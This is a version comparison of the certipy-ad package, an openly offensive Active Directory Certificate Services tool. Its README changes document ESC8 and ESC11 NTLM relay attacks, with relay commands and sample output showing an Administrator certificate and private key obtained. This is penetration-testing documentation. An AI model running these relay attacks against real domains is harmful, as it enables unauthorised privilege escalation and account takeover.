# Comparing `tmp/certipy-ad-4.6.0.tar.gz` & `tmp/certipy-ad-4.7.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "certipy-ad-4.6.0.tar", last modified: Mon Jul 17 22:02:27 2023, max compression
+gzip compressed data, was "certipy-ad-4.7.0.tar", last modified: Mon Jul 17 23:33:54 2023, max compression
```

## Comparing `certipy-ad-4.6.0.tar` & `certipy-ad-4.7.0.tar`

### file list

```diff
@@ -1,63 +1,63 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 22:02:27.128453 certipy-ad-4.6.0/
--rw-r--r--   0 runner    (1001) docker     (123)     1061 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)    40825 2023-07-17 22:02:27.128453 certipy-ad-4.6.0/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)    40570 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/README.md
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 22:02:27.120453 certipy-ad-4.6.0/certipy/
--rw-r--r--   0 runner    (1001) docker     (123)        0 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/__init__.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 22:02:27.124453 certipy-ad-4.6.0/certipy/commands/
--rw-r--r--   0 runner    (1001) docker     (123)        0 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/__init__.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     8712 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/account.py
--rwxr-xr-x   0 runner    (1001) docker     (123)    22772 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/auth.py
--rwxr-xr-x   0 runner    (1001) docker     (123)    34330 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/ca.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     2408 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/cert.py
--rwxr-xr-x   0 runner    (1001) docker     (123)    41865 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/find.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     7949 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/forge.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 22:02:27.124453 certipy-ad-4.6.0/certipy/commands/parsers/
--rwxr-xr-x   0 runner    (1001) docker     (123)      224 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/parsers/__init__.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     2115 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/parsers/account.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     3007 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/parsers/auth.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     3342 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/parsers/ca.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     1349 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/parsers/cert.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     2590 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/parsers/find.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     1943 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/parsers/forge.py
--rwxr-xr-x   0 runner    (1001) docker     (123)      907 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/parsers/ptt.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     2858 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/parsers/relay.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     3336 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/parsers/req.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     1454 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/parsers/shadow.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     2903 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/parsers/target.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     1378 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/parsers/template.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     3094 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/ptt.py
--rwxr-xr-x   0 runner    (1001) docker     (123)    15754 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/relay.py
--rwxr-xr-x   0 runner    (1001) docker     (123)    25062 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/req.py
--rwxr-xr-x   0 runner    (1001) docker     (123)    14281 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/shadow.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     8468 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/commands/template.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     1659 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/entry.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 22:02:27.128453 certipy-ad-4.6.0/certipy/lib/
--rw-r--r--   0 runner    (1001) docker     (123)        0 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/lib/__init__.py
--rwxr-xr-x   0 runner    (1001) docker     (123)    27227 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/lib/certificate.py
--rwxr-xr-x   0 runner    (1001) docker     (123)    17569 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/lib/constants.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     2569 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/lib/errors.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     2382 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/lib/formatting.py
--rwxr-xr-x   0 runner    (1001) docker     (123)    10035 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/lib/kerberos.py
--rwxr-xr-x   0 runner    (1001) docker     (123)    14433 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/lib/ldap.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     2332 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/lib/logger.py
--rwxr-xr-x   0 runner    (1001) docker     (123)    10623 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/lib/pkinit.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     5138 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/lib/rpc.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     2015 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/lib/security.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 22:02:27.128453 certipy-ad-4.6.0/certipy/lib/sspi/
--rwxr-xr-x   0 runner    (1001) docker     (123)       53 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/lib/sspi/__init__.py
--rwxr-xr-x   0 runner    (1001) docker     (123)    32016 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/lib/sspi/encryption.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     4557 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/lib/sspi/kerberos.py
--rwxr-xr-x   0 runner    (1001) docker     (123)    52996 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/lib/sspi/netsecapi.py
--rwxr-xr-x   0 runner    (1001) docker     (123)    37531 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/lib/structs.py
--rwxr-xr-x   0 runner    (1001) docker     (123)    10790 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/lib/target.py
--rwxr-xr-x   0 runner    (1001) docker     (123)      396 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/certipy/version.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 22:02:27.128453 certipy-ad-4.6.0/certipy_ad.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)    40825 2023-07-17 22:02:27.000000 certipy-ad-4.6.0/certipy_ad.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)     1460 2023-07-17 22:02:27.000000 certipy-ad-4.6.0/certipy_ad.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-17 22:02:27.000000 certipy-ad-4.6.0/certipy_ad.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)       47 2023-07-17 22:02:27.000000 certipy-ad-4.6.0/certipy_ad.egg-info/entry_points.txt
--rw-r--r--   0 runner    (1001) docker     (123)      189 2023-07-17 22:02:27.000000 certipy-ad-4.6.0/certipy_ad.egg-info/requires.txt
--rw-r--r--   0 runner    (1001) docker     (123)        8 2023-07-17 22:02:27.000000 certipy-ad-4.6.0/certipy_ad.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-07-17 22:02:27.128453 certipy-ad-4.6.0/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)     1011 2023-07-17 22:02:15.000000 certipy-ad-4.6.0/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 23:33:54.151665 certipy-ad-4.7.0/
+-rw-r--r--   0 runner    (1001) docker     (123)     1061 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)    42323 2023-07-17 23:33:54.151665 certipy-ad-4.7.0/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)    42068 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/README.md
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 23:33:54.143664 certipy-ad-4.7.0/certipy/
+-rw-r--r--   0 runner    (1001) docker     (123)        0 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/__init__.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 23:33:54.147664 certipy-ad-4.7.0/certipy/commands/
+-rw-r--r--   0 runner    (1001) docker     (123)        0 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/__init__.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     8712 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/account.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)    22772 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/auth.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)    34330 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/ca.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     2408 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/cert.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)    41865 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/find.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     7949 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/forge.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 23:33:54.147664 certipy-ad-4.7.0/certipy/commands/parsers/
+-rwxr-xr-x   0 runner    (1001) docker     (123)      224 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/parsers/__init__.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     2115 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/parsers/account.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     3007 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/parsers/auth.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     3342 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/parsers/ca.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     1349 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/parsers/cert.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     2590 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/parsers/find.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     1943 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/parsers/forge.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)      907 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/parsers/ptt.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     3169 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/parsers/relay.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     3336 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/parsers/req.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     1454 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/parsers/shadow.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     2903 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/parsers/target.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     1378 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/parsers/template.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     3094 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/ptt.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)    25181 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/relay.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)    25062 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/req.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)    14281 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/shadow.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     8468 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/commands/template.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     1659 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/entry.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 23:33:54.151665 certipy-ad-4.7.0/certipy/lib/
+-rw-r--r--   0 runner    (1001) docker     (123)        0 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/lib/__init__.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)    27227 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/lib/certificate.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)    17569 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/lib/constants.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     2569 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/lib/errors.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     2382 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/lib/formatting.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)    10035 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/lib/kerberos.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)    14433 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/lib/ldap.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     2332 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/lib/logger.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)    10623 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/lib/pkinit.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     5138 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/lib/rpc.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     2015 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/lib/security.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 23:33:54.151665 certipy-ad-4.7.0/certipy/lib/sspi/
+-rwxr-xr-x   0 runner    (1001) docker     (123)       53 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/lib/sspi/__init__.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)    32016 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/lib/sspi/encryption.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     4557 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/lib/sspi/kerberos.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)    52996 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/lib/sspi/netsecapi.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)    37531 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/lib/structs.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)    10790 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/lib/target.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)      396 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/certipy/version.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-17 23:33:54.151665 certipy-ad-4.7.0/certipy_ad.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)    42323 2023-07-17 23:33:54.000000 certipy-ad-4.7.0/certipy_ad.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)     1460 2023-07-17 23:33:54.000000 certipy-ad-4.7.0/certipy_ad.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-17 23:33:54.000000 certipy-ad-4.7.0/certipy_ad.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       47 2023-07-17 23:33:54.000000 certipy-ad-4.7.0/certipy_ad.egg-info/entry_points.txt
+-rw-r--r--   0 runner    (1001) docker     (123)      189 2023-07-17 23:33:54.000000 certipy-ad-4.7.0/certipy_ad.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        8 2023-07-17 23:33:54.000000 certipy-ad-4.7.0/certipy_ad.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-07-17 23:33:54.151665 certipy-ad-4.7.0/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)     1011 2023-07-17 23:33:40.000000 certipy-ad-4.7.0/setup.py
```

### Comparing `certipy-ad-4.6.0/LICENSE` & `certipy-ad-4.7.0/LICENSE`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/PKG-INFO` & `certipy-ad-4.7.0/README.md`

 * *Files 1% similar despite different names*

```diff
@@ -1,17 +1,7 @@
-Metadata-Version: 2.1
-Name: certipy-ad
-Version: 4.6.0
-Summary: Active Directory Certificate Services enumeration and abuse
-Home-page: https://github.com/ly4k/Certipy
-Author: ly4k
-License: MIT
-Description-Content-Type: text/markdown
-License-File: LICENSE
-
 # Certipy
 
 [![Upload Python Package](https://github.com/ly4k/Certipy/actions/workflows/python-publish.yml/badge.svg)](https://github.com/ly4k/Certipy/actions/workflows/python-publish.yml)
 
 Certipy is an offensive tool for enumerating and abusing Active Directory Certificate Services (AD CS). If you're not familiar with AD CS and the various domain escalation techniques, I highly recommend reading [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2) by [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin_).
 
 ## Table of Contents
@@ -769,43 +759,64 @@
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
 
 #### ESC8
 
 ESC8 is when an Enrollment Service has installed and enabled Web Enrollment via HTTP.
 
-To start the relay server, we can run the `relay` command and specify the CA's IP in `-ca`.
+To start the relay server, we can run the `relay` command and specify the CA's IP in `-target http://<ip>`.
 
 By default, Certipy will request a certificate based on the `Machine` or `User` template depending on whether the relayed account name ends with `$`. It is possible to specify another template with the `-template` parameter.
 
-We can then use a technique such as [PetitPotam](https://github.com/ly4k/PetitPotam) to coerce authentication. For domain controllers, we must specify `-template DomainController`.
+We can then use a tool such as [Coercer](https://github.com/p0dalirius/Coercer) to coerce authentication. For domain controllers, we must specify `-template DomainController`.
 
 ```bash
-$ certipy relay -ca ca.corp.local
-Certipy v4.0.0 - by Oliver Lyak (ly4k)
+$ certipy relay -target 'http://ca.corp.local'
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
 
-[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
+[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp (ESC8)
 [*] Listening on 0.0.0.0:445
 [*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
 [*] Got certificate with UPN 'Administrator@corp.local'
 [*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
 [*] Saved certificate and private key to 'administrator.pfx'
 [*] Exiting...
 ```
 
 #### ESC9 & ESC10
 
 ESC9 and ESC10 is not related to any specific Certipy commands or parameters, but can be abused with Certipy. See the [blog post](https://research.ifcr.dk/7237d88061f7) for more information.
 
 #### ESC11
 
-ESC11 can be abused with impacket's ntlmrelayx:
+ESC11 is when the certificate authority is not configured with IF_ENFORCEENCRYPTICERTREQUEST. This makes the RPC service vulnerable to NTLM relay attacks without signing, such as via SMB. The attack is similar to ESC8, except that we're targeting the RPC protocol instead of the HTTP protocol.
+
+To start the relay server, we can run the `relay` command and specify the CA's IP in `-target rpc://<ip>`. We must also specify the name of the certificate authority in `-ca <name>`.
+
+By default, Certipy will request a certificate based on the `Machine` or `User` template depending on whether the relayed account name ends with `$`. It is possible to specify another template with the `-template` parameter.
+
+We can then use a tool such as [Coercer](https://github.com/p0dalirius/Coercer) to coerce authentication. For domain controllers, we must specify `-template DomainController`.
 
 ```bash
-$ ntlmrelayx.py -t rpc://ca.corp.local -rpc-mode ICPR -icpr-ca-name corp-DC-CA -smb2support
+$ certipy relay -target 'rpc://ca.corp.local' -ca 'corp-ca'
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Targeting rpc://ca.corp.local (ESC11)
+[*] Listening on 0.0.0.0:445
+[*] Connecting to ncacn_ip_tcp:ca.corp.local[135] to determine ICPR stringbinding
+[*] Attacking user 'Administrator@CORP'
+[*] Template was not defined. Defaulting to Machine/User
+[*] Requesting certificate for user 'Administrator' with template 'User'
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 1
+[*] Got certificate with UPN 'Administrator@corp.local'
+[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
+[*] Saved certificate and private key to 'administrator.pfx'
+[*] Exiting...
 ```
 
 ## Contact
 
 Please submit any bugs, issues, questions, or feature requests under "Issues" or send them to me on Twitter [@ly4k_](https://twitter.com/ly4k_).
 
 ## Credits
```

### Comparing `certipy-ad-4.6.0/README.md` & `certipy-ad-4.7.0/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,7 +1,17 @@
+Metadata-Version: 2.1
+Name: certipy-ad
+Version: 4.7.0
+Summary: Active Directory Certificate Services enumeration and abuse
+Home-page: https://github.com/ly4k/Certipy
+Author: ly4k
+License: MIT
+Description-Content-Type: text/markdown
+License-File: LICENSE
+
 # Certipy
 
 [![Upload Python Package](https://github.com/ly4k/Certipy/actions/workflows/python-publish.yml/badge.svg)](https://github.com/ly4k/Certipy/actions/workflows/python-publish.yml)
 
 Certipy is an offensive tool for enumerating and abusing Active Directory Certificate Services (AD CS). If you're not familiar with AD CS and the various domain escalation techniques, I highly recommend reading [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2) by [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin_).
 
 ## Table of Contents
@@ -759,43 +769,64 @@
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
 
 #### ESC8
 
 ESC8 is when an Enrollment Service has installed and enabled Web Enrollment via HTTP.
 
-To start the relay server, we can run the `relay` command and specify the CA's IP in `-ca`.
+To start the relay server, we can run the `relay` command and specify the CA's IP in `-target http://<ip>`.
 
 By default, Certipy will request a certificate based on the `Machine` or `User` template depending on whether the relayed account name ends with `$`. It is possible to specify another template with the `-template` parameter.
 
-We can then use a technique such as [PetitPotam](https://github.com/ly4k/PetitPotam) to coerce authentication. For domain controllers, we must specify `-template DomainController`.
+We can then use a tool such as [Coercer](https://github.com/p0dalirius/Coercer) to coerce authentication. For domain controllers, we must specify `-template DomainController`.
 
 ```bash
-$ certipy relay -ca ca.corp.local
-Certipy v4.0.0 - by Oliver Lyak (ly4k)
+$ certipy relay -target 'http://ca.corp.local'
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
 
-[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
+[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp (ESC8)
 [*] Listening on 0.0.0.0:445
 [*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
 [*] Got certificate with UPN 'Administrator@corp.local'
 [*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
 [*] Saved certificate and private key to 'administrator.pfx'
 [*] Exiting...
 ```
 
 #### ESC9 & ESC10
 
 ESC9 and ESC10 is not related to any specific Certipy commands or parameters, but can be abused with Certipy. See the [blog post](https://research.ifcr.dk/7237d88061f7) for more information.
 
 #### ESC11
 
-ESC11 can be abused with impacket's ntlmrelayx:
+ESC11 is when the certificate authority is not configured with IF_ENFORCEENCRYPTICERTREQUEST. This makes the RPC service vulnerable to NTLM relay attacks without signing, such as via SMB. The attack is similar to ESC8, except that we're targeting the RPC protocol instead of the HTTP protocol.
+
+To start the relay server, we can run the `relay` command and specify the CA's IP in `-target rpc://<ip>`. We must also specify the name of the certificate authority in `-ca <name>`.
+
+By default, Certipy will request a certificate based on the `Machine` or `User` template depending on whether the relayed account name ends with `$`. It is possible to specify another template with the `-template` parameter.
+
+We can then use a tool such as [Coercer](https://github.com/p0dalirius/Coercer) to coerce authentication. For domain controllers, we must specify `-template DomainController`.
 
 ```bash
-$ ntlmrelayx.py -t rpc://ca.corp.local -rpc-mode ICPR -icpr-ca-name corp-DC-CA -smb2support
+$ certipy relay -target 'rpc://ca.corp.local' -ca 'corp-ca'
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Targeting rpc://ca.corp.local (ESC11)
+[*] Listening on 0.0.0.0:445
+[*] Connecting to ncacn_ip_tcp:ca.corp.local[135] to determine ICPR stringbinding
+[*] Attacking user 'Administrator@CORP'
+[*] Template was not defined. Defaulting to Machine/User
+[*] Requesting certificate for user 'Administrator' with template 'User'
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 1
+[*] Got certificate with UPN 'Administrator@corp.local'
+[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
+[*] Saved certificate and private key to 'administrator.pfx'
+[*] Exiting...
 ```
 
 ## Contact
 
 Please submit any bugs, issues, questions, or feature requests under "Issues" or send them to me on Twitter [@ly4k_](https://twitter.com/ly4k_).
 
 ## Credits
```

### Comparing `certipy-ad-4.6.0/certipy/commands/account.py` & `certipy-ad-4.7.0/certipy/commands/account.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/commands/auth.py` & `certipy-ad-4.7.0/certipy/commands/auth.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/commands/ca.py` & `certipy-ad-4.7.0/certipy/commands/ca.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/commands/cert.py` & `certipy-ad-4.7.0/certipy/commands/cert.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/commands/find.py` & `certipy-ad-4.7.0/certipy/commands/find.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/commands/forge.py` & `certipy-ad-4.7.0/certipy/commands/forge.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/commands/parsers/account.py` & `certipy-ad-4.7.0/certipy/commands/parsers/account.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/commands/parsers/auth.py` & `certipy-ad-4.7.0/certipy/commands/parsers/auth.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/commands/parsers/ca.py` & `certipy-ad-4.7.0/certipy/commands/parsers/ca.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/commands/parsers/cert.py` & `certipy-ad-4.7.0/certipy/commands/parsers/cert.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/commands/parsers/find.py` & `certipy-ad-4.7.0/certipy/commands/parsers/find.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/commands/parsers/forge.py` & `certipy-ad-4.7.0/certipy/commands/parsers/forge.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/commands/parsers/ptt.py` & `certipy-ad-4.7.0/certipy/commands/parsers/ptt.py`

 * *Files identical despite different names*

### Comparing `certipy-ad-4.6.0/certipy/commands/parsers/relay.py` & `certipy-ad-4.7.0/certipy/commands/parsers/relay.py`

 * *Files 8% similar despite different names*

```diff
@@ -10,24 +10,30 @@
     relay.entry(options)
 
 
 def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
     subparser = subparsers.add_parser(NAME, help="NTLM Relay to AD CS HTTP Endpoints")
 
     subparser.add_argument(
-        "-ca",
+        "-target",
         action="store",
         metavar="hostname",
         required=True,
-        help="IP address or hostname of certificate authority",
+        help="protocol://IP address or hostname of certificate authority. Example: http://ca.corp.local for ESC8 or rpc://ca.corp.local for ESC11",
     )
     subparser.add_argument("-debug", action="store_true", help="Turn debug output on")
 
